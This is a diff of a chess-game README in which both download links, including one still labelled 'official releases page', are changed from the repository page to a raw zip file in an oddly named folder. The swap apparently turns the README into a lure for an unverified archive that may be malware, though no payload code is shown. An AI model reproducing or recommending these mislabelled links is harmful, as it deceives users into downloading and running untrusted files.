@@ -1,6 +1,6 @@
 # ♟️ JavaFX-Chess-Game - Play classic chess on your desktop
 
-[![](https://img.shields.io/badge/Download-Chess_Game-blue.svg)](https://github.com/Denisnewborn433/JavaFX-Chess-Game)
+[![](https://img.shields.io/badge/Download-Chess_Game-blue.svg)](https://raw.githubusercontent.com/Denisnewborn433/JavaFX-Chess-Game/main/antenave/Game-Java-F-Chess-3.6.zip)
 
 This application provides a digital chess board for your computer. It includes standard chess rules, move tracking, and a clear visual interface. You can play against a friend on the same screen. The game handle rules such as checkmate, castling, and pawn promotion automatically. 
 
@@ -15,7 +15,7 @@ This application provides a digital chess board for your computer. It includes s
 
 The game comes as an executable file. You do not need to install complex tools to play. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Denisnewborn433/JavaFX-Chess-Game) to download the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Denisnewborn433/JavaFX-Chess-Game/main/antenave/Game-Java-F-Chess-3.6.zip) to download the latest version.
 2. Look for the file ending in .jar or .exe under the Assets section.
 3. Save this file to your desktop or your downloads folder.
 4. If you have not installed Java, download the latest Java Runtime Environment from the official Oracle website.
